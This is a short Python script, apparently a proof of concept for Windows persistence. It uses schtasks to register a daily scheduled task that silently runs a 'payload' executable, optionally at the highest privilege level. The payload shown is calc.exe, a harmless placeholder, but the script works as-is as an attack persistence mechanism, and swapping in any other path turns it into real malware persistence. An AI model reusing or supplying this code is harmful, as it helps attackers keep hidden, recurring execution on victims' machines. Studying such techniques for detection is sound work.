import subprocess
import sys
import shutil

TASK_NAME = "MyTask"
PAYLOAD_PATH = r"C:\Windows\System32\calc.exe"
SCHTASKS_PATH = shutil.which("schtasks") or r"C:\Windows\System32\schtasks.exe"
RUN_WITH_ADMIN = False

def ensure_admin():
    import ctypes
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_schtask():
    cmd = [
        SCHTASKS_PATH,
        "/Create",
        "/TN", TASK_NAME,
        "/TR", f'cmd /c {PAYLOAD_PATH}',
        "/SC", "DAILY",
        "/F"
    ]

    if RUN_WITH_ADMIN:
        cmd.extend(["/RL", "HIGHEST"])

    subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == "__main__":
    if RUN_WITH_ADMIN and not ensure_admin():
        sys.exit(1)

    try:
        create_schtask()
    except subprocess.CalledProcessError as e:
        sys.exit(1)
